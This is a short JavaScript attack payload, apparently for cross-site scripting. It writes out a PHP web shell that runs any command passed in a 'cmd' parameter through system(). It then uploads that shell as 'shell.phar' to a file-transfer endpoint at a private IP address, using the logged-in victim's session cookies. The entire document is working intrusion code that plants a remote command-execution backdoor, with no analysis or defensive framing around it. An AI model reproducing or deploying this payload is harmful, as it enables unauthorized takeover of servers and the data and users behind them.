alert("Payload loaded");
(async () => {
  const content = "<?php\n" +
    "if (isset($_GET['cmd'])) {\n" +
    "  echo \"<pre>\";\n" +
    "  system($_GET['cmd']);\n" +
    "  echo \"</pre>\";\n" +
    "  exit;\n" +
    "}\n" +
    "?>\n" +
    "<!DOCTYPE html>\n" +
    "<html>\n" +
    "<head><title>Shell</title></head>\n" +
    "<body style='background:#000;color:#0f0;font-family:monospace;'>\n" +
    "<h3>Remote Shell</h3>\n" +
    "<form method='GET'>\n" +
    "  <input type='text' name='cmd' style='width:70%;background:#111;color:#0f0;border:1px solid #0f0;' autofocus>\n" +
    "  <input type='submit' value='Run'>\n" +
    "</form>\n" +
    "</body>\n" +
    "</html>";

  const file = new File([content], "shell.phar", { type: "text/plain" });

  const form = new FormData();
  form.append("localfile", file);
  form.append("MAX_FILE_SIZE", "1000000");
  form.append("act", "upload");
  form.append("dir", "");
  form.append("submit", "Upload");

  await fetch("https://10.23.108.10/app/ft/ft2.php", {
    method: "POST",
    credentials: "include",
    body: form
  });
})();
